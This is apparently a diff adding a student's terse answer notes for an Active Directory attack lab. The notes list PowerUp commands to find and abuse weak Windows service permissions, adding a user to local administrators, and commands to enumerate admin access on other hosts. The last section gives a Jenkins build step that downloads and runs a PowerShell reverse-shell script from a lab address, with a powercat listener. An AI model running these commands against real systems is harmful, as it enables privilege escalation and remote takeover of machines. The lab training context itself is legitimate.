@@ -1,0 +1,41 @@
+? Exploit a service on dcorp-studentx and elevate privileges to local administrator.
+? Identify a machine in the domain where studentx has local administrative access.
+? Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -
+the dcorp-ci server
+
+
+
+A: 
+	1- Enumerate unqouted service paths 
+		 . .\PowerUp.ps1
+		 Get-ServiceUnquoted
+
+	2- Enumerate service which you can modify its binary 
+		
+		Get-ModifiableServiceFile -Verbose
+
+	3- Enumerate weak service permissions 
+		
+		 Get-ModifiableService
+
+	4- Add user to admins using the weak service permission name 
+	
+		 Invoke-ServiceAbuse  -Name SNMPTRAP -UserName 'dcorp\student348'
+
+B: 
+ 		Confirm Admin Local Access 
+		A- . .\Find-PSRemotingLocalAdminAccess.ps1
+		Find-PSRemotingLocalAdminAccess 
+
+		B- Find-LocalAdminAccess -Verbose
+		
+		Execute Remote Commands <<  Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local>> 
+
+
+C: 
+   Login using build user 		
+	. .\powercat.ps1
+	Build execute shell 
+		powershell.exe -c iex (iwr http://172.16.100.48/Invoke-PowerShellTCP.ps1);power -Reverse -IPAddress 172.16.100.48 -Port 443 
+	 
+		powercat -l -p 443 -verbose 
